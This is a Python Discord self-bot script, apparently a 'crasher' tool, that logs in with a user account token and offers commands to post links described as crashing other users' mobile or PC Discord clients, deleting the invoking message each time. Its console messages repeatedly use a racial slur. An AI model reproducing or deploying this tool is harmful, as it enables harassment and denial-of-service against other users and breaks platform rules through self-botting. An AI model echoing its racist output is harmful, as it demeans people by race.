import discord 
from discord.ext import commands
import colorama
from colorama import init, Fore, Back, Style
import ctypes

# Dont just skid it, gimme some credits, thank you - J9C 
 # Dont just skid it, gimme some credits, thank you - J9C
  # Dont just skid it, gimme some credits, thank you - J9C
   # Dont just skid it, gimme some credits, thank you - J9C
    # Dont just skid it, gimme some credits, thank you - J9C
     # Dont just skid it, gimme some credits, thank you - J9C 
      # Dont just skid it, gimme some credits, thank you - J9C
       # Dont just skid it, gimme some credits, thank you - J9C
        # Dont just skid it, gimme some credits, thank you - J9C
         # Dont just skid it, gimme some credits, thank you - J9C
          # Dont just skid it, gimme some credits, thank you - J9C
           # Dont just skid it, gimme some credits, thank you - J9C
            # Dont just skid it, gimme some credits, thank you - J9C

init(convert=True)
prefix = "."

FOURISHOT = commands.Bot(command_prefix=prefix, self_bot=True)
FOURISHOT.remove_command('help')

ctypes.windll.kernel32.SetConsoleTitleA("4")

@FOURISHOT.event
async def on_connect():
    print(f'''{Fore.RED}
    
               ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██          ███▄    █  ██▓  ▄████   ▄████ ▓█████  ██▀███    ██████ 
               ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒        ██ ▀█   █ ▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ 
               ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░       ▓██  ▀█ ██▒▒██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒░ ▓██▄   
               ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██        ▓██▒  ▐▌██▒░██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒
               ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓       ▒██░   ▓██░░██░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒▒██████▒▒
               ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒       ░ ▒░   ▒ ▒ ░▓   ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
                 ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░       ░ ░░   ░ ▒░ ▒ ░  ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░
               ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░          ░   ░ ░  ▒ ░░ ░   ░ ░ ░   ░    ░     ░░   ░ ░  ░  ░  
               ░ ░         ░           ░  ░      ░   ░  ░  ░            ░  ░        ░       ░    ░  ░   ░           ░  
               ░                                                                                                       
                        
                                                                [Commands]

                                                     [1] crashmobile - crashes mobile ppl
                                                     [2] crashpc - crashes pc
                                                     [3] crashorange - sends orange crash gif
                                                     [4] crashall - sends all the gifs

                                                                                        
                                                                                        
                                                          (made by J9C for four <3)                                                                 ''')

@FOURISHOT.command()
async def crashmobile(ctx):
    await ctx.message.delete()
    await ctx.send('https://imgur.com/r/discordapp/ehxMcVy')
    print("   ")
    print("                                                  [SYSTEM INFORMATION] CRASHED A MOBILE NIGGER")

@FOURISHOT.command()
async def crashpc(ctx):
    await ctx.message.delete()
    await ctx.send('https://not-cyrus.github.io/?hi')
    print("   ")
    print("                                                  [SYSTEM INFORMATION] CRASHED A PC NIGGER")

@FOURISHOT.command()
async def crashorange(ctx):
    await ctx.message.delete()
    await ctx.send('http://tornadus.net/orange')
    print("   ")
    print("                                                  [SYSTEM INFORMATION] CRASHED A NIGGER WITH A ORANGE")

@FOURISHOT.command()
async def crashall(ctx):
    await ctx.message.delete()
    await ctx.send('https://not-cyrus.github.io/?hi http://tornadus.net/orange https://imgur.com/r/discordapp/ehxMcVy')
    print("   ")
    print("                                                  [SYSTEM INFORMATION] CRASHED THE FUCK OUT A NIGGER")

FOURISHOT.run('Token Goes here', bot=False)